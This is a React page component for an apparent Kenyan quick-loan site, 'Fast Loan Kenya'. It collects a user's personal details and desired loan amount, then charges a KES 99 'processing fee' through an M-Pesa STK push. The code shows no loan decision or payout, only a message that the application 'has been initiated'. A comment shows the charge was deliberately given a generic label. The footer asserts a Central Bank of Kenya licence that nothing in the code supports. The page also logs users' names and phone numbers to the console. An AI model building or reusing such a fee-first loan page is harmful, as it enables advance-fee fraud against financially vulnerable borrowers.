import { useState, useEffect } from "react";
import { type CRBFormData, formatPhoneForMpesa } from "@/lib/validation";
import { CRBForm } from "@/components/CRBForm";
import { LoanSelection } from "@/components/LoanSelection";
import { ConfirmationCard } from "@/components/ConfirmationCard";
import { TrustBadges } from "@/components/TrustBadges";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";
import { Shield, FileSearch } from "lucide-react";

type PaymentStatus = 'idle' | 'pending' | 'processing' | 'success' | 'failed' | 'cancelled' | 'insufficient';

const Index = () => {
  const [step, setStep] = useState<'form' | 'loan' | 'confirmation'>('form');
  const [formData, setFormData] = useState<CRBFormData | null>(null);
  const [paymentStatus, setPaymentStatus] = useState<PaymentStatus>('idle');
  const [isLoading, setIsLoading] = useState(false);
  const [checkoutRequestId, setCheckoutRequestId] = useState<string | null>(null);
  const { toast } = useToast();

  const handleFormSubmit = (data: CRBFormData) => {
    // Move to loan selection step first
    setFormData(data);
    setPaymentStatus('idle');
    setStep('loan');
  };

  const handleLoanNext = (payload: { loanAmount: number }) => {
    if (!formData) return;
    const merged = { ...formData, loanAmount: payload.loanAmount } as CRBFormData & { loanAmount?: number };
    setFormData(merged as CRBFormData);
    setStep('confirmation');
    setPaymentStatus('idle');
  };

  const handleBack = () => {
    // Navigate back in the flow
    if (step === 'confirmation') {
      setStep('loan');
    } else {
      setStep('form');
    }
    setPaymentStatus('idle');
    setCheckoutRequestId(null);
  };

  const handleConfirmPayment = async () => {
    if (!formData) return;
    // CRB check is always performed (KES 99). Proceed with the existing MPesa STK push flow.
    // Otherwise proceed with existing MPesa STK push behavior
    setIsLoading(true);
    setPaymentStatus('pending');

    try {
      console.debug('Initiating STK Push with payload:', {
        phoneNumber: formatPhoneForMpesa(formData.phoneNumber),
        amount: 99,
        accountReference: `Processing fee`,
        transactionDesc: `Processing fee for ${formData.fullName}`,
      });
      const { data, error } = await supabase.functions.invoke('mpesa-stk-push', {
        body: {
          phoneNumber: formatPhoneForMpesa(formData.phoneNumber),
          amount: 99,
          // Use a generic account reference and description that reference the processing fee
          accountReference: `Processing fee`,
          transactionDesc: `Processing fee for ${formData.fullName}`,
        },
      });

      console.debug('STK Push response:', { data, error });

      if (error) {
        throw error;
      }

      if (data?.success && data?.checkoutRequestId) {
        setCheckoutRequestId(data.checkoutRequestId);
        toast({
          title: "STK Push Sent",
          description: "Check your phone and enter your M-Pesa PIN",
        });
        // Start polling for payment status
        pollPaymentStatus(data.checkoutRequestId);
      } else {
        throw new Error(data?.message || 'Failed to initiate payment');
      }
    } catch (error: any) {
      console.error('Payment error:', error);
      setPaymentStatus('failed');
      toast({
        title: "Payment Error",
        description: error.message || "Failed to initiate M-Pesa payment",
        variant: "destructive",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const pollPaymentStatus = async (requestId: string) => {
    let attempts = 0;
    const maxAttempts = 30; // 60 seconds max (2s intervals)

    const poll = async () => {
      if (attempts >= maxAttempts) {
        setPaymentStatus('failed');
        toast({
          title: "Timeout",
          description: "Payment confirmation timed out. Please check your M-Pesa messages.",
          variant: "destructive",
        });
        return;
      }

      try {
        const { data, error } = await supabase.functions.invoke('mpesa-query-status', {
          body: { checkoutRequestId: requestId },
        });

        if (error) throw error;

        const resultCode = data?.resultCode;

        if (resultCode === '0') {
          setPaymentStatus('success');
          toast({
            title: "Payment Successful!",
            description: "Your application has been initiated.",
          });
          return;
        } else if (resultCode === '1032') {
          setPaymentStatus('cancelled');
          return;
        } else if (resultCode === '1') {
          setPaymentStatus('insufficient');
          return;
        } else if (data?.status === 'pending') {
          attempts++;
          setTimeout(poll, 2000);
        } else if (resultCode) {
          setPaymentStatus('failed');
          return;
        } else {
          attempts++;
          setTimeout(poll, 2000);
        }
      } catch (error) {
        console.error('Poll error:', error);
        attempts++;
        setTimeout(poll, 2000);
      }
    };

    poll();
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Hero Section */}
      <div className="gradient-hero text-primary-foreground">
        <div className="container mx-auto px-4 py-12 md:py-16">
          <div className="text-center max-w-2xl mx-auto">
            {/* Logo */}
            <div className="flex justify-center mb-6">
              <div className="w-20 h-20 rounded-2xl gradient-gold shadow-gold flex items-center justify-center animate-float">
                <FileSearch className="w-10 h-10 text-secondary-foreground" />
              </div>
            </div>

            <h1 className="text-3xl md:text-4xl lg:text-5xl font-bold mb-4 animate-fade-in">
              Fast Loan Kenya
            </h1>
            <p className="text-lg md:text-xl opacity-90 mb-2 animate-fade-in" style={{ animationDelay: '100ms' }}>
              Quick small loans with fast approval
            </p>
            <p className="text-sm opacity-75 animate-fade-in" style={{ animationDelay: '200ms' }}>
              Powered by our trusted partners
            </p>
          </div>
        </div>

        {/* Wave Separator */}
        <div className="h-16 bg-background" style={{
          clipPath: 'ellipse(70% 100% at 50% 100%)',
          marginTop: '-4rem',
        }} />
      </div>

      {/* Main Content */}
      <div className="container mx-auto px-4 -mt-8 pb-12">
        <div className="max-w-md mx-auto">
          {/* Card */}
          <div className="bg-card rounded-2xl shadow-xl border border-border p-6 md:p-8 animate-slide-up">
            {step === 'form' ? (
              <>
                <div className="text-center mb-6">
                  <div className="inline-flex items-center gap-2 px-3 py-1 bg-primary/10 rounded-full text-primary text-sm font-medium mb-4">
                    <Shield className="w-4 h-4" />
                    Secure & Confidential
                  </div>
                  <h2 className="text-xl font-semibold text-foreground">Enter Your Details</h2>
                  <p className="text-muted-foreground text-sm mt-1">
                    We'll verify your details to process your loan application
                  </p>
                </div>
                <CRBForm onSubmit={handleFormSubmit} />
              </>
            ) : step === 'loan' && formData ? (
              <LoanSelection
                defaultAmount={(formData as any).loanAmount ?? 10000}
                onNext={handleLoanNext}
                onBack={() => setStep('form')}
              />
            ) : formData ? (
              <ConfirmationCard
                data={formData}
                onBack={handleBack}
                onConfirmPayment={handleConfirmPayment}
                paymentStatus={paymentStatus}
                isLoading={isLoading}
              />
            ) : null}
          </div>

          {/* Trust Badges */}
          <TrustBadges />

          {/* Info Section */}
          <div className="mt-8 text-center text-sm text-muted-foreground space-y-4">
            <div className="bg-muted/50 rounded-xl p-4">
                <h3 className="font-medium text-foreground mb-2">About Fast Loan</h3>
                <p>
                  Fast Loan helps you access small, short-term loans quickly. We perform a fast
                  verification and processing step so lenders can make timely decisions.
                </p>
              </div>

            <div className="flex items-center justify-center gap-2 text-xs">
              <span>Powered by</span>
              <span className="font-semibold text-primary">M-Pesa</span>
              <span>•</span>
              <span>Processing fee KES 99</span>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="border-t border-border py-6">
        <div className="container mx-auto px-4 text-center text-sm text-muted-foreground">
          <p>© 2026 Kenya fast loan. All rights reserved.</p>
          <p className="mt-1">Licensed by Central Bank of Kenya</p>
        </div>
      </footer>
    </div>
  );
};

export default Index;
